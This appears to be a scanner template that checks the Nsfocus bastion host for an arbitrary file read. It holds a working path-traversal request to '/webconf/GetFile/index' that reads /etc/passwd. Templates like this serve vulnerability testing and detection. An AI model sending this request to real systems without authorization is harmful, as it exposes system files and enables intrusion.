id: nsfocus-lfi
brief:
    title: Nsfocus - Arbitrary File Read
    by: ritikchaddha
    level: high
    about: Nsfocus bastion has an Arbitrary File Read Vulnerability through '/webconf/GetFile/'.
    label:
        - nsfocus
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/user/requireLogin'
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
      head:
        Content-Type: application/x-www-form-urlencoded
      signs: []
